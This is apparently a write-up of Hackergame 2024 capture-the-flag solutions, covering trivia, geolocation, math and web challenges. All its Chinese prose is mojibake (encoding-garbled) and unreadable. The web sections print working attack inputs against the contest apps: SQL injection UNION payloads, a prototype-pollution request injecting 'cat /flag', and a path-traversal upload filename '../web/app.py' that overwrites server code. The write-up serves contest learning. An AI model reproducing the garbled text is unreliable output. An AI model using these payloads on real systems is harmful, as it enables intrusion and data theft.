å½“å‰åˆ†æ•°ï¼š2950ï¼Œæ€»æ’åï¼š160 / 2460

AIï¼š0 ï¼Œ binaryï¼š0 ï¼Œ generalï¼š1000 ï¼Œ mathï¼š850 ï¼Œ webï¼š1100 



âŒï¼šè¡¨ç¤ºæ­¤é¢˜**æœªè§£å‡º**



## ç­¾åˆ°

> Hackergame å“¦ Hackergame å“¦ Hackergame
>
> æœ‰äº†ä½ ç”Ÿæ´»ç¾å¥½æ²¡çƒ¦æ¼

é©¬ä¸Šå¯åŠ¨ï¼

å‘ç°è·³è½¬åˆ° http://202.38.93.141:12024/?pass=false

ä¿®æ”¹ false ä¸º true

http://202.38.93.141:12024/?pass=true



## å–œæ¬¢åšç­¾åˆ°çš„ CTFer ä½ ä»¬å¥½å‘€

åœ¨æ¯”èµ›é¦–é¡µ - æ‰¿åŠå•ä½å¤„æ‰¾åˆ° [ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ NEBULA æˆ˜é˜Ÿï¼ˆUSTC NEBULAï¼‰](https://www.nebuu.la/)

```bash
ls -la
cat .flag
```

è·å¾—ç¬¬äºŒä¸ª flag



`help` æŸ¥çœ‹æœ‰å“ªäº› command å¯ç”¨

```bash
Welcome! Here are all the available commands:

=========== Available Commands ===============

about awards banner bing cat cd echo
email env github help ls members nvim
readme repo sudo sumfetch vi whoami 

==============================================
```

ä¸€ä¸ªä¸ªè¯•åˆ° `env`

```bash
PWD=/root/Nebula-Homepage
ARCH=loong-arch
NAME=Nebula-Dedicated-High-Performance-Workstation
OS=NixOSâ„ï¸
FLAG=flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}
REQUIREMENTS=1. you must come from USTC; 2. you must be interested in security!
```

è·å¾—ç¬¬ä¸€ä¸ª flag



## çŒ«å’ªé—®ç­”ï¼ˆHackergame åå‘¨å¹´çºªå¿µç‰ˆï¼‰

1. åœ¨ Hackergame 2015 æ¯”èµ›å¼€å§‹å‰ä¸€å¤©æ™šä¸Šå¼€å±•çš„èµ›å‰è®²åº§æ˜¯åœ¨å“ªä¸ªæ•™å®¤ä¸¾è¡Œçš„ï¼Ÿ**ï¼ˆ30 åˆ†ï¼‰**

```
3A204
```

æœç´¢ `2015 ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ç¬¬äºŒå±Šä¿¡æ¯å®‰å…¨å¤§èµ›æ—¶é—´`ï¼Œå¾—åˆ° https://lug.ustc.edu.cn/wiki/sec/contest.html?do=export_raw

> 10 æœˆ 17 æ—¥ å‘¨å…­æ™šä¸Š 19:30 3A204 ç½‘ç»œæ”»é˜²æŠ€å·§è®²åº§



2. ä¼—æ‰€å‘¨çŸ¥ï¼ŒHackergame å…±çº¦ 25 é“é¢˜ç›®ã€‚è¿‘äº”å¹´ï¼ˆä¸å«ä»Šå¹´ï¼‰ä¸¾åŠçš„ Hackergame ä¸­ï¼Œé¢˜ç›®æ•°é‡æœ€æ¥è¿‘è¿™ä¸ªæ•°å­—çš„é‚£ä¸€å±Šæ¯”èµ›é‡Œæœ‰å¤šå°‘äººæ³¨å†Œå‚åŠ ï¼Ÿ**ï¼ˆ30 åˆ†ï¼‰**

```
2682
```

| æ—¶é—´ | é¢˜ç›®æ•°é‡ | æ³¨å†Œäººæ•°  | å‚è€ƒé“¾æ¥                                                     |
| ---- | -------- | --------- | ------------------------------------------------------------ |
| 2019 | 28       | 2682      | https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/        |
| 2020 | 31       | 3733      | https://lug.ustc.edu.cn/news/2020/12/hackergame-2020/        |
| 2021 | 31       | 4023      | https://lug.ustc.edu.cn/news/2021/11/hackergame-2021/        |
| 2022 | 33       | è¶…è¿‡ 4500 | https://lug.ustc.edu.cn/news/2023/03/hackergame-award-ceremony/ |
| 2023 | 29       | è¶…è¿‡ 4100 | https://lug.ustc.edu.cn/news/2023/12/hackergame-2023/        |



3. Hackergame 2018 è®©å“ªä¸ªçƒ­é—¨æ£€ç´¢è¯æˆä¸ºäº†ç§‘å¤§å›¾ä¹¦é¦†å½“æœˆçƒ­æœç¬¬ä¸€ï¼Ÿ**ï¼ˆ20 åˆ†ï¼‰**

```
ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»
```

å‚è€ƒå½“å¹´çŒ«å’ªé—®ç­” ç¬¬å››é¢˜

>åœ¨ä¸­å›½ç§‘å¤§å›¾ä¹¦é¦†ä¸­ï¼Œæœ‰ä¸€æœ¬ä¹¦å«åšã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»:é“¾æ¥ã€è£…è½½ä¸åº“ã€‹ï¼Œè¯·é—®å®ƒçš„ç´¢ä¹¦å·æ˜¯ï¼Ÿ
>
>æ‰“å¼€[ä¸­å›½ç§‘å¤§å›¾ä¹¦é¦†ä¸»é¡µ](https://lib.ustc.edu.cn/)ï¼Œç›´æ¥æœç´¢â€œç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»â€å³å¯ã€‚



4. åœ¨ä»Šå¹´çš„ USENIX Security å­¦æœ¯ä¼šè®®ä¸Šä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å‘è¡¨äº†ä¸€ç¯‡å…³äºç”µå­é‚®ä»¶ä¼ªé€ æ”»å‡»çš„è®ºæ–‡ï¼Œåœ¨è®ºæ–‡ä¸­ä½œè€…æå‡ºäº† 6 ç§æ”»å‡»æ–¹æ³•ï¼Œå¹¶åœ¨å¤šå°‘ä¸ªç”µå­é‚®ä»¶æœåŠ¡æä¾›å•†åŠå®¢æˆ·ç«¯çš„ç»„åˆä¸Šè¿›è¡Œäº†å®éªŒï¼Ÿ

```
336
```

https://www.usenix.org/conference/usenixsecurity24/technical-sessions æœç´¢ `University of Science and Technology of China`ï¼Œæ‰¾åˆ°å¯¹åº”è®ºæ–‡ [FakeBehalf: Imperceptible Email Spoofing Attacks against the Delegation Mechanism in Email Systems](https://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui)

~~è¯»è®ºæ–‡è¿™ç§äº‹æƒ…ï¼Œäº¤ç»™ AI~~



5. 10 æœˆ 18 æ—¥ Greg Kroah-Hartman å‘ Linux é‚®ä»¶åˆ—è¡¨æäº¤çš„ä¸€ä¸ª patch æŠŠå¤§é‡å¼€å‘è€…ä» MAINTAINERS æ–‡ä»¶ä¸­ç§»é™¤ã€‚è¿™ä¸ª patch è¢«åˆå¹¶è¿› Linux mainline çš„ commit id æ˜¯å¤šå°‘ï¼Ÿ**ï¼ˆ5 åˆ†ï¼‰**

```
6e90b6
```

https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2



6. å¤§è¯­è¨€æ¨¡å‹ä¼šæŠŠè¾“å…¥åˆ†è§£ä¸ºä¸€ä¸ªä¸€ä¸ªçš„ token åç»§ç»­è®¡ç®—ï¼Œè¯·é—®è¿™ä¸ªç½‘é¡µçš„ HTML æºä»£ç ä¼šè¢« Meta çš„ Llama 3 70B æ¨¡å‹çš„ tokenizer åˆ†è§£ä¸ºå¤šå°‘ä¸ª tokenï¼Ÿ**ï¼ˆ5 åˆ†ï¼‰**

```
1833
```

huggingface ä¸Šç”³è¯·ä¸€ç›´åœ¨ PENDINGï¼Œåªèƒ½çˆ†ç ´äº†

ï¼ˆ2024/11/09 æ³¨ï¼šä¾æ—§ PENDINGï¼‰



## æ‰“ä¸å¼€çš„ç›’

è¯¢é—® AI å¾—åˆ°å¦‚ä¸‹ä»‹ç»

> .STLï¼ˆStereolithographyï¼‰æ–‡ä»¶æ˜¯ä¸€ç§å¸¸ç”¨çš„ä¸‰ç»´æ¨¡å‹æ–‡ä»¶æ ¼å¼ï¼Œä¸»è¦ç”¨äº3Dæ‰“å°ã€‚
>
> ......
>
> www.viewstl.com åœ¨çº¿æŸ¥çœ‹å’Œç¼–è¾‘STLæ–‡ä»¶

ä» â€œ2024â€ çš„ â€œ0â€ ä¸­å¯ä»¥çœ‹åˆ° flag



## æ¯æ—¥è®ºæ–‡å¤ªå¤šäº†ï¼

https://dl.acm.org/doi/10.1145/3650212.3652145

ä¸‹è½½ PDF åå…¨æ–‡æœç´¢ flag

åœ¨ Figure 4 å¤„æ‰¾åˆ° `flag here`ï¼Œæ³¨æ„åˆ°æ­¤å¤„çš„ç¥ç§˜è¾¹æ¡†

ä½¿ç”¨ Acrobat ç§»é™¤æ‰ä¸Šé¢çš„ç™½è‰²é®ç›–åå³å¯çœ‹åˆ° flag



## æ¯”å¤§å°ç‹

æ§åˆ¶å°è¿è¡Œå¦‚ä¸‹ä»£ç ï¼š

```javascript
for (let i = 0; i < state.values.length; i++) {
    const [value1, value2] = state.values[i];
    const input = value1 < value2 ? '<' : '>';
    state.inputs.push(input)
}
state.inputs
submit(state.inputs)
```

äº¤çš„ä¸å¯¹ä¼šæç¤º `æ£€æµ‹åˆ°å¼‚å¸¸æäº¤`

äº¤å¾—å¤ªå¿«ä¼šæç¤º `æ£€æµ‹åˆ°æ—¶ç©ºç©¿è¶Šï¼ŒæŒ‘æˆ˜å¤±è´¥ï¼`



## æ—…è¡Œç…§ç‰‡ 4.0

1. ç…§ç‰‡æ‹æ‘„çš„ä½ç½®è·ç¦»ä¸­ç§‘å¤§çš„å“ªä¸ªæ ¡é—¨æ›´è¿‘ï¼Ÿï¼ˆæ ¼å¼ï¼š`Xæ ¡åŒºYé—¨`ï¼Œå‡ä¸ºä¸€ä¸ªæ±‰å­—ï¼‰
2. è¯è¯´ Leo é…±ä¸Šæ¬¡å‡ºç°åœ¨æ¡æ¶ä¸Šæ˜¯â€¦â€¦ç§‘å¤§ä»Šå¹´çš„ ACG éŸ³ä¹ä¼šï¼Ÿæ´»åŠ¨æ—¥æœŸæˆ‘æ²¡è®°é”™çš„è¯æ˜¯ï¼Ÿï¼ˆæ ¼å¼ï¼š`YYYYMMDD`ï¼‰

```
ä¸œæ ¡åŒºè¥¿é—¨
20240519
```

åœ°å›¾æœç´¢ `ç§‘å¤§ç¡…è°· ç§‘é‡Œç§‘æ°”ç§‘åˆ›é©¿ç«™`ï¼Œå¹¶é€šè¿‡è¡—æ™¯æ¯”å¯¹

https://map.baidu.com/poi/%E4%B8%AD%E5%9B%BD%E8%9C%80%E5%B1%B1%E7%A7%91%E9%87%8C%E7%A7%91%E6%B0%94%E7%A7%91%E5%88%9B%E9%A9%BF%E7%AB%99(%E7%A7%91%E5%A4%A7%E7%AB%99)/@13054831,3720055,21z,87t,55.23h#panoid=0901050012220925094354214AI&panotype=street&heading=304.77&pitch=5.8&l=21&tn=B_NORMAL_MAP&sc=0&newmap=1&shareurl=1&pid=0901050012220925094354214AI&psp=%7B%22PanoModule%22%3A%7B%22markerUid%22%3A%22847a2f26f36115f5f33cba4a%22%7D%7D

æœç´¢ `ç§‘å¤§ 2024 ACG éŸ³ä¹ä¼š`ï¼Œæ‰¾åˆ°äº† [ä¸­ç§‘å¤§LEOåŠ¨æ¼«åä¼šçš„ç›´æ’­é—´](https://live.bilibili.com/787482)

ç¿»é˜…åŠ¨æ€å¾—åˆ° https://www.bilibili.com/opus/930934582351495204



3. è¿™ä¸ªå…¬å›­çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆä¸éœ€è¦å¡«å†™å…¬å›­æ‰€åœ¨å¸‚åŒºç­‰ä¿¡æ¯ï¼‰
4. è¿™ä¸ªæ™¯è§‚æ‰€åœ¨çš„æ™¯ç‚¹çš„åå­—æ˜¯ï¼Ÿï¼ˆä¸‰ä¸ªæ±‰å­—ï¼‰

```
ä¸­å¤®å…¬å›­
å›å­å²­
```

æ³¨æ„åˆ°åƒåœ¾æ¡¶ä¸Šçš„å…­å®‰ æœç´¢ `å…­å®‰ å…¬å›­ ä¸‰è‰²è·‘é“` å¾—åˆ° ä¸­å¤®å…¬å›­

è¯†å›¾å¾—åˆ° æˆªæµçŸ³ï¼Œç»§ç»­åœ°å›¾æœç´¢å¾—åˆ° å›å­å²­



5. è·ç¦»æ‹æ‘„åœ°æœ€è¿‘çš„åŒ»é™¢æ˜¯ï¼Ÿï¼ˆæ— éœ€åŒ…å«é™¢åŒºã€åœ°åä¿¡æ¯ï¼Œæ ¼å¼ï¼šXXXåŒ»é™¢ï¼‰
6. å·¦ä¸‹è§’çš„**åŠ¨è½¦ç»„å‹å·**æ˜¯ï¼Ÿ

```
ç§¯æ°´æ½­åŒ»é™¢
CRH6F-A
```

æ³¨æ„åˆ°é¢˜ç›®ä¸­çš„å››ç¼–ç»„åŠ¨è½¦ä»¥åŠå›¾ç‰‡å·¦ä¸‹è§’ç²‰çº¢è‰²æ¶‚è£… æœç´¢ `å››ç¼–ç»„åŠ¨è½¦ ç²‰çº¢è‰²` å¾—åˆ° æ€€å¯†å· CRH6F-A

æ³¨æ„åˆ°å›¾ç‰‡æ‹æ‘„çš„ä¸ºåŠ¨è½¦æ‰€ï¼Œç»“åˆåˆšæ‰å¾—åˆ°çš„æ€€å¯†å·å¯çŸ¥æ˜¯åŒ—äº¬åŒ—ï¼Œç»§ç»­åœ°å›¾æœç´¢ `åŒ—äº¬åŒ— åŠ¨è½¦æ‰€` å¾—åˆ° åŒ—äº¬ç§¯æ°´æ½­åŒ»é™¢(æ–°é¾™æ³½é™¢åŒº)



## ä¸å®½çš„å®½å­—ç¬¦

å‡è®¾æœ‰ä¸€ä¸ª wchar_t ç±»å‹çš„å­—ç¬¦ '0x1234'

ç”±äºæ˜¯å°ç«¯åºï¼ˆlittle-endianï¼‰ï¼Œåˆ™ `0x1234` åœ¨å†…å­˜ä¸­çš„è¡¨ç¤ºæ˜¯ `0x34 0x12`

å¼ºåˆ¶è½¬æ¢æˆ char ç±»å‹ï¼Œå˜ä¸ºä¸¤ä¸ªå­—ç¬¦ '0x34' '0x12'



å°† `Z:\theflag` æŒ‰ç…§å¦‚ä¸Šæ–¹æ³•åå‘è½¬æ¢ï¼š

```
Z:\theflag
0x5A 0x3A 0x5C 0x74 0x68 0x65 0x66 0x6C 0x61 0x67

0x3A5A 0x745C 0x6568 0x6C66 0x6761
ã©šç‘œæ•¨æ±¦æ¡
```

æ³¨æ„åˆ°å­—ç¬¦ä¸²æœ€åè¢«é™„åŠ äº†ä¸€æ®µ `you_cant_get_the_flag`

å› æ­¤è¿˜éœ€è¦ä¸€ä¸ª '0x00' è®©å­—ç¬¦ä¸²æå‰ç»“æŸ

éšä¾¿æ‰¾ä¸€ä¸ªä½å…«ä½ä¸º 0x00 çš„å­—å³å¯



payload

```
ã©šç‘œæ•¨æ±¦æ¡æ€€
```



## âŒPowerfulShell

å¯ä»¥ä½¿ç”¨çš„å­—ç¬¦ï¼š

```
~`${}[]\|:123456789+-_=
```



æ„é€ å‡ºäº†ä»¥ä¸‹å­—ç¬¦

```bash
>$$
7
>$-
hB
>$_
input

${-::1} h
${-:1:1} B
${_::1} i
${_:1:1} n
${_:2:1} p
${_:3:1} u
${_:4:1} t
```



## Node.js is Web Scale

æŸ¥çœ‹æºç å‘ç°éœ€è¦å¾€ cmds é‡ŒåŠ ä¸€ä¸ª `payload: 'cat /flag'`

ä½†ç°åœ¨åªèƒ½å¾€ store é‡ŒåŠ ä¸œè¥¿ï¼Œæ€ä¹ˆæ‰èƒ½åŒæ—¶åŠ åˆ° cmds é‡Œå‘¢ï¼Ÿ

è¯¶ï¼Œ`__proto__` 



```
POST /set
{"key":"__proto__.payload","value":"cat /flag"}

GET /execute?cmd=payload
```



## PaoluGPT

### åƒé‡ŒæŒ‘ä¸€

éå†èŠå¤©è®°å½•åˆ—è¡¨ å¯è·å¾— flag



### çª¥è§†æœªçŸ¥

æŸ¥çœ‹æºç å‘ç°å¯ä»¥SQLæ³¨å…¥

```python
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```



æ„é€ payload å¯è·å¾— flag

```
' OR shown = false AND '1'='1
```



```
' UNION SELECT id, contents FROM messages WHERE contents LIKE '%flag%' LIMIT 1 --
```

```
' UNION SELECT id, contents FROM messages WHERE contents LIKE '%flag%' LIMIT 1,1 --
```



## â„¹å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼

### Easy

æ³¨æ„åˆ° 2000 = 16 * 125

```
(0|16|32|48|64|80|96|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992)|((0|1|2|3|4|5|6|7|8|9)*(((2|4|6|8|0)(000|016|032|048|064|080|096|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992))|((1|3|5|7|9)(008|024|040|056|072|088|104|120|136|152|168|184|200|216|232|248|264|280|296|312|328|344|360|376|392|408|424|440|456|472|488|504|520|536|552|568|584|600|616|632|648|664|680|696|712|728|744|760|776|792|808|824|840|856|872|888|904|920|936|952|968|984))))
```

ï¼ˆ801å­—ç¬¦ï¼‰



ä¸è¿‡å› ä¸ºä¸€èˆ¬éšæœºä¸åˆ°0~1000ï¼Œå¯ä»¥çœç•¥è¿™ä¸€éƒ¨åˆ†

```
(0|1|2|3|4|5|6|7|8|9)*(((2|4|6|8|0)(000|016|032|048|064|080|096|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992))|((1|3|5|7|9)(008|024|040|056|072|088|104|120|136|152|168|184|200|216|232|248|264|280|296|312|328|344|360|376|392|408|424|440|456|472|488|504|520|536|552|568|584|600|616|632|648|664|680|696|712|728|744|760|776|792|808|824|840|856|872|888|904|920|936|952|968|984)))
```

ï¼ˆ553å­—ç¬¦ï¼‰

[regex101: build, test and debug regex](https://regex101.com/)



### âŒMedium

https://blog.csdn.net/xindoo/article/details/102643270

https://blog.csdn.net/kittyjie/article/details/54907771

å…ˆæ„é€  DFAï¼Œå†ç”± DFA æ¨å¯¼å‡ºæ­£åˆ™è¡¨è¾¾å¼

~~ç¼– è¯‘ åŸ ç†~~

æ€ä¹ˆå…«ç™¾ä¸‡å­—ç¬¦ï¼ˆ



## æƒœå­—å¦‚é‡‘ 3.0

### é¢˜ç›® A

```python
#!/usr/bin/python3                                                              
                                                                                
import atexit, base64, flask, itertools, os, re                                 
                                                                                
                                                                                
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = 'AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA', 48 
    assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'A' 
    flip = sum(['a', 'A'].index(poly[i + 1]) << i for i in range(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in range(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 else 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xCb4EcdfD0A9F, 0xa9dec1C1b7A3, 0x60c4B0aAB4Bf                 
    assert (u2, u1, u0) == (223539323800223, 186774198532003, 106397893833919)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'little')                                   
                                                                                
                                                                                
def xzrj(input: bytes) -> bytes:                                                
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'                 
    return re.sub(pat, repl, input, flags=re.IGNORECASE)                        
                                                                                
                                                                                
paths: list[bytes] = []                                                         
                                                                                
xzrj_bytes: bytes = bytes()                                                     
                                                                                
with open(__file__, 'rb') as f:                                                 
    for row in f.read().splitlines():                                           
        row = (row.rstrip() + b' ' * 80)[:80]                                   
        path = base64.b85encode(hash(row)) + b'.txt'                            
        with open(path, 'wb') as pf:                                            
            pf.write(row)                                                       
            paths.append(path)                                                  
            xzrj_bytes += xzrj(row) + b'\r\n'                                   
                                                                                
    def clean():                                                                
        for path in paths:                                                      
            try:                                                                
                os.remove(path)                                                 
            except FileNotFoundError:                                           
                pass                                                            
                                                                                
    atexit.register(clean)                                                      
                                                                                
                                                                                
bp: flask.Blueprint = flask.Blueprint('answer_a', __name__)                     
                                                                                
                                                                                
@bp.get('/answer_a.py')                                                         
def get() -> flask.Response:                                                    
    return flask.Response(xzrj_bytes, content_type='text/plain; charset=UTF-8') 
                                                                                
                                                                                
@bp.post('/answer_a.py')                                                        
def post() -> flask.Response:                                                   
    wrong_hints = {}                                                            
    req_lines = flask.request.get_data().splitlines()                           
    iter = enumerate(itertools.zip_longest(paths, req_lines), start=1)          
    for index, (path, req_row) in iter:                                         
        if path is None:                                                        
            wrong_hints[index] = 'Too many lines for request data'              
            break                                                               
        if req_row is None:                                                     
            wrong_hints[index] = 'Too few lines for request data'               
            continue                                                            
        req_row_hash = hash(req_row)                                            
        req_row_path = base64.b85encode(req_row_hash) + b'.txt'                 
        if not os.path.exists(req_row_path):                                    
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'       
            continue                                                            
        with open(req_row_path, 'rb') as pf:                                    
            row = pf.read()                                                     
            if len(req_row) != len(row):                                        
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'       
                continue                                                        
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b] 
            if unmatched:                                                       
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'  
                continue                                                        
            if path != req_row_path:                                            
                wrong_hints[index] = f'Matched but in other lines'              
                continue                                                        
    if wrong_hints:                                                             
        return {'wrong_hints': wrong_hints}, 400                                
    with open('answer_a.txt', 'rb') as af:                                      
        answer_flag = base64.b85decode(af.read()).decode()                      
        closing, opening = answer_flag[-1:], answer_flag[:5]                    
        assert closing == '}' and opening == 'flag{'                            
        return {'answer_flag': answer_flag}, 200                                
```



## ä¼˜é›…çš„ä¸ç­‰å¼

### Easy

[çŸ¥ä¹ - ã€ç§‘æ™®ã€‘å¦‚ä½•ä¼˜é›…åœ°â€œæ³¨æ„åˆ°â€å…³äºeã€Ï€çš„ä¸ç­‰å¼](https://zhuanlan.zhihu.com/p/669285539)

æ³¨æ„åˆ° $\int_{0}^{1} \frac{x \left(1-x\right) \left(a+bx+cx^2\right)} {1+x^2} dx = \frac{1}{4}\left(a-b-c\right)\pi+\frac{1}{2}\left(a+b-c\right)\ln2+\left(-a+\frac{1}{2}b+\frac{7}{6}c\right)$

å°†é—®é¢˜è½¬åŒ–ä¸ºï¼Œå¯»æ‰¾ $a,b,c$ æ»¡è¶³ $q\pi-p = \frac{1}{4}\left(a-b-c\right)\pi+\frac{1}{2}\left(a+b-c\right)\ln2+\left(-a+\frac{1}{2}b+\frac{7}{6}c\right)$ ä½¿å¾— $a+bx+cx^2$ åœ¨ $\left[0,1\right]$ ä¸Šæ’éè´Ÿ



```python
x*(1-x)*(8-2*x+6*x**2)/(1+x*x)		#pi-2
x*(1-x)*(12-6*x+6*x**2)/(1+x*x)/3	#pi-8/3
```



## å…³ç¯

### Easy

æš´åŠ›æ±‚è§£éœ€è¦ $2^{27}$ æ¬¡ï¼Œå¤§çº¦ 40 åˆ†é’Ÿ

è¯•ä¸ªå‡ åæ¬¡æ€»èƒ½ç¢°åˆ°ä¸€æ¬¡èƒ½åœ¨ 3 åˆ†é’Ÿå†…è§£å‡ºæ¥çš„ï¼ˆ



ç¬‘ç‚¹è§£æï¼š

```
Enter difficulty level (1~4): 1
111101010011110101111111111
Enter your answer: ^C

Connection closed
```



### Medium

è§£æ³•è§ Hard



### Hard

é«˜æ–¯æ¶ˆå…ƒæ³•æ±‚è§£å¼‚æˆ–æ–¹ç¨‹ç»„

```python
import numpy as np

def create_matrix(n):
    size = n ** 3
    matrix = np.zeros((size, size), dtype=int)
    
    for i in range(n):
        for j in range(n):
            for k in range(n):
                index = i * n**2 + j * n + k
                matrix[index, index] = 1
                
                if i > 0:
                    matrix[index, (i-1) * n**2 + j * n + k] = 1
                if i < n-1:
                    matrix[index, (i+1) * n**2 + j * n + k] = 1
                if j > 0:
                    matrix[index, i * n**2 + (j-1) * n + k] = 1
                if j < n-1:
                    matrix[index, i * n**2 + (j+1) * n + k] = 1
                if k > 0:
                    matrix[index, i * n**2 + j * n + (k-1)] = 1
                if k < n-1:
                    matrix[index, i * n**2 + j * n + (k+1)] = 1
                    
    return matrix

def solve_puzzle(matrix, vector):
    n = len(vector)
    
    for i in range(n):
        # æ‰¾åˆ°ä¸»å…ƒæ‰€åœ¨è¡Œ
        max_row = i
        for j in range(i + 1, n):
            if abs(matrix[j, i]) > abs(matrix[max_row, i]):
                max_row = j
        
        # äº¤æ¢è¡Œ
        matrix[[i, max_row]] = matrix[[max_row, i]]
        vector[[i, max_row]] = vector[[max_row, i]]
        
        # å¯¹äºæ¯ä¸€è¡Œï¼Œå¦‚æœä¸»å…ƒä¸æ˜¯0ï¼Œå°±è¿›è¡Œæ¶ˆå…ƒ
        if matrix[i, i] != 0:
            for j in range(i + 1, n):
                if matrix[j, i] != 0:
                    factor = matrix[j, i] / matrix[i, i]
                    matrix[j] ^= int(factor) * matrix[i]
                    vector[j] ^= int(factor) * vector[i]
    
    # å›ä»£æ±‚è§£
    solution = np.zeros(n, dtype=int)
    for i in range(n-1, -1, -1):
        solution[i] = vector[i]
        for j in range(i + 1, n):
            solution[i] ^= matrix[i, j] * solution[j]
    
    return solution

lights_string = input("Enter your puzzle: ").strip()
n = round(len(lights_string) ** (1/3))
lights_array = np.array(list(map(int, lights_string)), dtype=np.uint8).reshape(n, n, n)
vector = lights_array.flatten()

# åˆ›å»ºç³»æ•°çŸ©é˜µ
matrix = create_matrix(n)

# ä½¿ç”¨é«˜æ–¯æ¶ˆå…ƒæ³•æ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„
solution_array = solve_puzzle(matrix, vector)
solution_string = "".join(map(str, solution_array.flatten().tolist()))
print("Solution:")
print(solution_string)
```



## ç¦æ­¢å†…å·

é¦–å…ˆæƒ³åˆ°æ ¹æ®åé¦ˆçš„å¹³æ–¹å·®ï¼Œé€ä¸ªè°ƒæ•´æ¯é¡¹çš„å€¼ï¼Œä½¿å¾—å¹³æ–¹å·®æœ€å°

æ¢¯ åº¦ ä¸‹ é™

å¾—åˆ° flag å¦‚ä¸‹

```
flag{unoAAAA_esrever_now_U_run_MY_cAdeAfecAcAcAA}
```

æ€ä¹ˆä¸å¯¹å‘¢



æŸ¥çœ‹æºç å‘ç° answer å°äº 0 æ—¶ä¼šè¢«èµ‹å€¼ä¸º 0ï¼Œå› æ­¤è¿™ç§æ–¹æ³•è¡Œä¸é€š

```python
def get_answer():
    # scoring with answer
    # I could change answers anytime so let's just load it every time
    with open("answers.json") as f:
        answers = json.load(f)
        # sanitize answer
        for idx, i in enumerate(answers):
            if i < 0:
                answers[idx] = 0
    return answers
```



æ³¨æ„åˆ°æç¤ºï¼Œå¼€äº† `--reload`

è¿™æ„å‘³ç€å½“æºä»£ç æ–‡ä»¶å‘ç”Ÿä»»ä½•å˜åŒ–æ—¶ï¼ŒFlask æœåŠ¡å™¨ä¼šè‡ªåŠ¨é‡å¯ä»¥åº”ç”¨è¿™äº›æ›´æ”¹

äºæ˜¯å¯ä»¥ä¿®æ”¹æºä»£ç å¦‚ä¸‹ï¼š

```python
from flask import Flask, render_template_string
import json
import os

app = Flask(__name__)

JSON_FILE_PATH = 'answers.json'

@app.route('/')
def index():
    # è¯»å– answers.json æ–‡ä»¶
    if os.path.exists(JSON_FILE_PATH):
        with open(JSON_FILE_PATH, 'r') as file:
            answers = json.load(file)
    else:
        answers = {"error": "answers.json not found"}

    # æ¸²æŸ“é¡µé¢å¹¶æ˜¾ç¤ºç­”æ¡ˆ
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Answers</title>
        </head>
        <body>
            <h1>Answers</h1>
            <pre>{{ answers | tojson | safe }}</pre>
        </body>
        </html>
    ''', answers=answers)
```

å°†ä¸Šä¼ æ–‡ä»¶åæ”¹ä¸º `../web/app.py`

æ–‡ä»¶åä¸èƒ½åŒ…å« `/` ï¼Ÿ

å¯ä»¥åœ¨ POST çš„æ—¶å€™ä¿®æ”¹

```
Content-Disposition: form-data; name="file"; filename="../web/app.py"
```

åˆ·æ–°é¡µé¢ï¼Œè¿™æ ·å°±èƒ½è·å–åˆ° answers.json äº†



## é›¶çŸ¥è¯†æ•°ç‹¬

### æ•°ç‹¬é«˜æ‰‹

åšå®Œå››ä¸ªæ•°ç‹¬å¾—åˆ° flag



## âŒå…ˆä¸è¯´å…³äºæˆ‘ä»é›¶å¼€å§‹ç‹¬è‡ªåœ¨å¼‚ä¸–ç•Œè½¬ç”ŸæˆæŸå¤§å‚å®¶çš„ LLM é¾™çŒ«å¥³ä»†è¿™ä»¶äº‹å¯ä¸å¯èƒ½è¿™ä¹ˆç¦»è°±ï¼Œå‘ç° Hackergame å†…å®¹å®¡æŸ¥å§”å‘˜ä¼šå¿˜è®°å®¡æŸ¥é¢˜ç›®æ ‡é¢˜äº†ã”ã‚ã‚“ã­ï¼Œä»¥åŠã€Œè¿™ä¹ˆé•¿éƒ½å¿«èµ¶ä¸Šè½»å°è¯´äº†çœŸçš„ä¸ä¼šå½±å“ç”¨æˆ·ä½“éªŒå—ğŸ¤£ã€

